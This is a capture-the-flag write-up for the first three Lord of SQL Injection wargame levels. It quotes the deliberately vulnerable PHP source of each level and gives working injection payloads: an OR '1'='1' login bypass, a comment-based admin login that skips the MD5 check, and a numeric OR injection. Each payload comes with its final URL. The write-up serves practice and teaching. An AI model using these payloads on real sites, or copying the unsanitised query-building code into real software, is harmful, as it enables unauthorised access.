## Lord Of SQL Injection

At [los.rubiya.kr](https://los.rubiya.kr/).

### Gremlin:

```php
Challenge:

query : select id from prob_gremlin where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

We just need to bypass the login with the simple `1' OR '1'='1`.

Final Url: `https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php/?id=1&pw=1%27%20OR%20%271%27=%271`

Human Readable `https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php/?id=1&pw=1' OR '1'='1`

Final Query: `select id from prob_gremlin where id='1' and pw='1' OR '1'='1'`

### Cobolt

```php
Challenge:

query : select id from prob_cobolt where id='' and pw=md5('')

<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

We just need to bypass the MD5 password check and login as admin. So we use a `#` to comment out the MD5 check.

Final URL: `https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%20%23`

Human Readable: `https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin' #`

Final Query: `select id from prob_cobolt where id='admin' #' and pw=md5('')`

### Goblin

```php
Challenge:

query : select id from prob_goblin where id='guest' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

Currently, we cannot edit the `id='guest'` before the `'no'` parameter, so we must focus on making the `SELECT` statement's first part evaluate to `false`, allowing us to inject whatever usernumber `no` into the second part of the statement.

Firstly, by adding `?no=1` to the url, we see the statement `Hello guest`.

This means that `id='guest' and no=1` has evaluated to `true`.
Thus, to make it evaluate to `false`, we simply change the end of the url to `?no=2`.

Then, the webpage returns to "normal" and we know that the first part of the statement has evaluated to `false`.

Next, to get the webpage to say "Hello Admin", since we know that number 1 is guest, we can try to add a `or no=2` after the earlier payload to evaluate false. 

Thus, the final payload is `?no=2 or no=2`.

Final URL: `https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=2%20OR%20no=2`

Human Readable: `https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=2 OR no=2`

Final Query: `select id from prob_goblin where (id='guest' and no=2) OR no=2`
